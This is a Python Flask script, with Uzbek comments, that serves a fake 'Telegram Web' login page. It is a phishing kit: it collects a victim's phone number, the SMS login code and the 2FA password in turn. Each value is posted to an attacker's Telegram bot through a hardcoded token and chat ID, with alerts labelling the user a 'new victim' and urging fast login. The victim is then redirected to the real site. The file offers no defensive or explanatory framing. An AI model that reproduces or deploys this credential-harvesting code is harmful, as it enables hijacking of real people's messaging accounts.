from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

# Siz bergan ma'lumotlar
BOT_TOKEN = "8646824027:AAFJKnIwsqzmTH6F2yPyQAobA7GPrKENJRM"
CHAT_ID = "8547125019"

def send_to_tg(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": message})
    except:
        pass

# --- SAHIFALAR DIZAYNI (HTML) ---
HTML_STYLE = """
<style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .login-card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 350px; text-align: center; }
    img { width: 80px; margin-bottom: 20px; }
    input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
    button { width: 100%; padding: 12px; background-color: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; }
    button:hover { background-color: #0077b5; }
    p { color: #666; font-size: 14px; }
</style>
"""

@app.route('/')
def index():
    return render_template_string(HTML_STYLE + """
    <div class="login-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
        <h2>Telegram Web</h2>
        <p>Kirish uchun telefon raqamingizni kiriting</p>
        <form action="/auth/phone" method="post">
            <input type="text" name="phone" placeholder="+998901234567" required>
            <button type="submit">Keyingisi</button>
        </form>
    </div>
    """)

@app.route('/auth/phone', methods=['POST'])
def auth_phone():
    phone = request.form.get('phone')
    send_to_tg(f"📞 YANGI QURBON!\n📱 Raqam: {phone}\n\n⚠️ Tezda Telegramga kiriting va kod yuboring!")
    return render_template_string(HTML_STYLE + """
    <div class="login-card">
        <h2>Kodni tasdiqlash</h2>
        <p>Telegram orqali yuborilgan 5 xonali kodni kiriting</p>
        <form action="/auth/code" method="post">
            <input type="text" name="code" placeholder="12345" required maxlength="5">
            <button type="submit">Tasdiqlash</button>
        </form>
    </div>
    """)

@app.route('/auth/code', methods=['POST'])
def auth_code():
    code = request.form.get('code')
    send_to_tg(f"📩 SMS KOD KELDI!\n🔢 Kod: {code}")
    return render_template_string(HTML_STYLE + """
    <div class="login-card">
        <h2>Ikki bosqichli tekshiruv</h2>
        <p>Akkountingiz parol bilan himoyalangan. Parolni kiriting:</p>
        <form action="/auth/pass" method="post">
            <input type="password" name="password" placeholder="Parolingiz" required>
            <button type="submit">Kirish</button>
        </form>
    </div>
    """)

@app.route('/auth/pass', methods=['POST'])
def auth_pass():
    password = request.form.get('password')
    send_to_tg(f"🔐 2FA PAROL!\n🔑 Parol: {password}\n\n✅ Hammasi tayyor, akkountga kiring!")
    return redirect("https://web.telegram.org")

if name == '__main__':
    app.run(host='0.0.0.0', port=5000)
